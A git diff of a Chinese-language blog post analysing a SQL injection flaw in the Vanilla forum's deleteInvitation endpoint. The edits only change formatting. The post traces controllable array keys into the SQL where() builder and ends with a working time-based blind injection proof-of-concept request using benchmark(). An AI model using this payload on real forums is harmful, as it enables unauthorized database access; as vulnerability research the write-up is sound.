@@ -4,7 +4,6 @@ title: Vanilla SQL Injection Vulnerability
 categories: articles
 ---
 
-<h1 align="center">{{ page.title }}</h1>
 <p align="right" class="date">{{ page.date | date_to_string }} - Balis0ng</p>
 
 ## 简介
@@ -15,7 +14,8 @@ categories: articles
 
 首先在applications/dashboard/controllers/class.profilecontroller.php:274
 
-```
+{% highlight javascript %}
+
 public function deleteInvitation($invitationID) {
         $this->permission('Garden.SignIn.Allow');
 
@@ -30,7 +30,7 @@ public function deleteInvitation($invitationID) {
 
         $this->render('Blank', 'Utility');
     }
-```
+{% endhighlight %}
 
 这个函数有个形参$invitationID，这个值其实是我们通过URL传递进来的，是我们可控的，并且这里需要注意的是，该值是可以为一个数组。
 
@@ -42,7 +42,8 @@ public function deleteInvitation($invitationID) {
 
 applications/dashboard/models/class.invitationmodel.php:225
 
-```
+{% highlight javascript %}
+
 public function delete($where = [], $options = []) {
     if (is_numeric($where)) {
         deprecated('InvitationModel->delete(int)', 'InvitationModel->deleteID(int)');
@@ -51,11 +52,12 @@ public function delete($where = [], $options = []) {
     }
     parent::delete($where, $options);
 }
-```
+{% endhighlight %}
 
 &nbsp;&nbsp;&nbsp;这里的参数$where就是我们上文的$invitationID，是可控的，然后这里又将$where带入到了另外一个delete函数中，继续追踪。
 
-```
+{% highlight javascript %}
+
 public function delete($where = [], $options = []) {
     if (is_numeric($where)) {
         deprecated('Gdn_Model->delete(int)', 'Gdn_Model->deleteID()');
@@ -81,13 +83,14 @@ public function delete($where = [], $options = []) {
     }
     return $result;
 }
-```
+{% endhighlight %}
 
 然后该函数中又将$where带入到了$this->SQL->noReset()->delete函数中，继续追踪。
 
 library/database/class.sqldriver.php:333
 
-```
+{% highlight javascript %}
+
 public function delete($table = '', $where = '', $limit = false) {
 	if ($table == '') {
 	    if (!isset($this->_Froms[0])) {
@@ -120,11 +123,12 @@ public function delete($table = '', $where = '', $limit = false) {
 
 	return $this->query($sql, 'delete');
 	}
-```
+{% endhighlight %}
 
 &nbsp;&nbsp;&nbsp;该函数中对我们传递进来的$where有个判断和操作，如果不为空，就带入到where函数中去，跟踪一下该函数。
 
-```
+{% highlight javascript %}
+
 public function where($field, $value = null, $escapeFieldSql = true, $escapeValueSql = true) {
     if (!is_array($field)) {
         $field = [$field => $value];
@@ -147,7 +151,7 @@ public function where($field, $value = null, $escapeFieldSql = true, $escapeValu
     }
     return $this;
 }
-```
+{% endhighlight %}
 
 &nbsp;&nbsp;&nbsp;这里其实就是一个组装where语句的函数，由于$where我们可控制，导致这里组装后的where语句的字段处也可以控制，所以就产生了一个SQL注入漏洞。
 
@@ -158,7 +162,8 @@ public function where($field, $value = null, $escapeFieldSql = true, $escapeValu
 这里我使用的是延时注入，用的是benchmark函数。不同环境的延时时间也不一样的。
 附上POC:
 
-```
+{% highlight javascript %}
+
 POST /profile/deleteInvitation?invitationID[1%3dbenchmark(40000000,sha(1))+and+1]=balisong HTTP/1.1
 Host: localhost
 Content-Length: 29
@@ -175,7 +180,7 @@ Cookie: Drupal.toolbar.collapsed=0; hd_sid=udVsUw; XDEBUG_SESSION=PHPSTORM; Vani
 Connection: close
 
 TransientKey=caEyM0dSVZC0xDhU
-```
+{% endhighlight %}
 
 然后这里延时了9秒。如图所示:
 
